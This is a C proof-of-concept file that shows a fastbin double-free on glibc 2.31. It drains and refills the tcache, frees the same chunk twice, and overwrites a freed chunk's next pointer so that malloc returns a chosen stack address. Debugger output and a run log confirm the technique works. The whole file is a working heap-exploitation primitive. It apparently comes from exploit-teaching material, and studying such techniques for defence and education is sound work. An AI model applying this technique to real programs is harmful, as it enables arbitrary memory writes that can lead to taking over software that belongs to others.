#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<malloc.h>
#include<assert.h>

int main(){
	char *p_tcache[20];
	for(int i=0;i<7;i++){
		p_tcache[i] = malloc(0x40);
	}
	char *p1 = malloc(0x40);
	char *p2 = malloc(0x40);
	char *p3 = malloc(0x40);
	for(int i=0;i<7;i++){
		free(p_tcache[i]);
	}
	// Double Free in fastbin
	free(p1);
	free(p2);
	free(p1);
	// fastbin: p1->p2->p1
	for(int i=0;i<7;i++){
		p_tcache[i] = malloc(0x40);
	}
	/*
	fastbins
	0x50: 0x5555555594c0 —▸ 0x555555559510 ◂— 0x5555555594c0
	*/
	char *trigger = malloc(0x40);
	/*
	tcachebins
	0x50 [  3]: 0x555555559520 —▸ 0x5555555594d0 ◂— 0x555555559520
	*/
	
	long long *p_t = (long long*)trigger;
	long long target = 0x6666666;
	printf("target address is @ %p\n",&target);
	p_t[0] = &target; // edit "fd" (next)
	// p1->target
	char *p = malloc(0x40);
	char *q = malloc(0x40);
	char *r = malloc(0x40);
	printf("chunk r @ %p, where the target is!\n",r);
}
/*
➜  glibc-2.31 ./new_fastbin_double_free                                  
target address is @ 0x7fffdc8f6a18
chunk r @ 0x7fffdc8f6a18, where the target is!
*/
